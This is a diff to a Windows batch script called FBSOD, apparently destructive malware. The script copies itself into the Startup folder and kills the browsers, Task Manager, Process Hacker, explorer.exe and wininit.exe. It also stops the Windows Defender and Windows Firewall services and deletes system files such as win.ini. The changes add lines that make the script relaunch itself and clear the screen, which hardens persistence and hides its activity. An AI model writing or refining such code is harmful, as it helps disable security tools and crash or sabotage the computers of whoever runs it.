@@ -3,7 +3,7 @@ title FBSOD title FBSOD %username% %date% process %random%
 if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
   copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 )
-
+cls
 taskkill /F /IM "chrome.exe" /T
 taskkill /F /IM "firefox.exe" /T
 taskkill /F /IM "ProcessHacker.exe" /T
@@ -167,6 +167,8 @@ del c:windowswin.ini
 :start
 taskkill /f /im Taskmgr.exe
 start /min FBSOD.bat
+start "" "%~dpnx0"
+cls
 net send * WORKGROUP ENABLED
 net send * WORKGROUP ENABLED
 taskkill /f /im wininit.exe
@@ -175,11 +177,13 @@ cls
 start /min FBSOD.bat
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
+start "" "%~dpnx0"
 taskkill /F /IM "chrome.exe" /T
 taskkill /F /IM "firefox.exe" /T
 taskkill /F /IM "ProcessHacker.exe" /T
 taskkill /F /IM "explorer.exe" /T
 taskkill /F /IM "taskmgr.exe" /T
+cls
 goto e
 :e
 echo @echo off>c:windowshartlell.bat
